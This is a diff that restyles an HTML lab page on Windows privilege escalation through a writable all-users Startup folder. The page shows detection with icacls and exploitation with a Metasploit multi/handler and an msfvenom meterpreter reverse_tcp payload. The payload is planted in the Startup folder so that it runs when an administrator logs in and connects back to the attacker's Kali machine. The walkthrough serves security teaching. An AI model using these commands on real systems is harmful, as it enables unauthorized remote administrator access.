@@ -3,33 +3,42 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Overview (Startup Applications)</title>
-</head><body><b><u><div style="text-align: center"><span style="font-size: 20pt">Detection</span></div></u><span style="font-size: 15pt"><br/>
+</head><body><b><div style="text-align: center"><span style="font-size: 20pt"><span style="color: #ffa300">Detection</span></span></div><span style="font-size: 15pt"><br/>
 </span></b><span style="font-size: 15pt"><br/>
-<b><u>Windows VM</u></b><br/>
+<b>Windows VM</b><br/>
 <br/>
-1. Open command prompt and type: <b>icacls.exe</b>&nbsp;<b>"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"</b><br/>
+1. Open command prompt and type:<br/>
+<b>icacls.exe</b>&nbsp;<b>"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"</b><br/>
 2. From the output notice that the <b>“BUILTIN\Users”</b>&nbsp;group has full access <b>‘(F)’</b>&nbsp;to the directory.<br/>
 <br/>
-Exploitation<br/>
 <br/>
-Kali VM<br/>
+<br/>
+<br/>
+</span><span style="color: #ff0000"><b><div style="text-align: center"><span style="font-size: 20pt">Exploitation</span></div></b></span><span style="font-size: 15pt"><br/>
+</span><span style="font-size: 15pt"><br/>
+<b>Kali VM</b><br/>
 <br/>
 1. Open command prompt and type: msfconsole<br/>
-2. In Metasploit (msf &gt; prompt) type: use multi/handler<br/>
-3. In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp<br/>
-4. In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]<br/>
-5. In Metasploit (msf &gt; prompt) type: run<br/>
-6. Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe<br/>
-7. Copy the generated file, x.exe, to the Windows VM.<br/>
+2. In Metasploit <b>(msf &gt; prompt): use multi/handler</b><br/>
+3. In Metasploit <b>(msf &gt; prompt): set payload windows/meterpreter/reverse_tcp</b><br/>
+4. In Metasploit <b>(msf &gt; prompt): set lhost <i>[Kali VM IP Address]</i></b><br/>
+5. In Metasploit <b>(msf &gt; prompt): run</b><br/>
+6. Open another command prompt and type:<br/>
+<b>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe</b><br/>
+7. Copy the generated file, <b>x.exe</b>, to the Windows VM.<br/>
 <br/>
-Windows VM<br/>
 <br/>
-1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.<br/>
+<br/>
+<b>Windows VM</b><br/>
+<br/>
+1. Place x.exe in <b>“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”</b>.<br/>
 2. Logoff.<br/>
 3. Login with the administrator account credentials.<br/>
 <br/>
-Kali VM<br/>
+<br/>
+<br/>
+<b>Kali VM</b><br/>
 <br/>
 1. Wait for a session to be created, it may take a few seconds.<br/>
-2. In Meterpreter(meterpreter &gt; prompt) type: getuid<br/>
-3. From the output, notice the user is “User-PC\Admin”</span></body></html>
+2. In Meterpreter <b>(meterpreter &gt; prompt) : getuid</b><br/>
+3. From the output, notice the user is <b>“User-PC\Admin”</b></span></body></html>
